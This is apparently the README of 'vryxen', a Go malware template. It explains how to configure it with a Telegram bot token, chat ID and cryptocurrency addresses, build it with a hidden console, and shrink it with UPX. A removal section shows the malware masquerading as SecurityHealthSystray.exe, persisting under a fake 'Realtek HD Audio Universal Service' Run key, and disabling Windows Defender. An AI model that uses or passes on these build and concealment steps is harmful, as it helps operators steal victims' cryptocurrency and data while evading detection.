## Getting started

## Usage

You can use the Project template:

- Open `cmd/main.go` and edit config with your Telegram Bot Token, Your Chat Id, and your crypto addresses

- Build the template: (reduce binary size by using `-s -w`)

```bash
go build -ldflags "-s -w"
```

- You can hide the console without `hideconsole` module (you must remove `common.IsAlreadyRunning()` check from `cmd/main.go` before) by running

```bash
go build -ldflags "-s -w -H=windowsgui"
```

- You can also optionally pack the output executable with UPX which will reduce the binary size from ~10MB to ~3MB. To do this, install [UPX](https://github.com/upx/upx/releases/) and run

```bash
upx.exe --ultra-brute vryxen.exe
```

- You can also use vryxen in your own Go code. Just import the desired module like this:
```go
package main

import "github.com/unf6/vryxen/internal/hc"

func main() {
  HideConsole.Hide()
}
```

# Remove

This guide will help you removing vryxen from your system

1. Open powershell as administrator

2. Kill processes that could be vryxen

```bash
taskkill /f /t /im vryxen.exe
taskkill /f /t /im SecurityHealthSystray.exe
```

(use `tasklist` to list all running processes, vryxen.exe and SecurityHealthSystray.exe are the default names)

3. Remove vryxen from startup
```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
```

(Realtek HD Audio Universal Service is the default name)

4. Enable Windows defender:

You can do it by running this [.bat script](https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat) (I'm not the developer behind it, make sure the file does not contain malware)
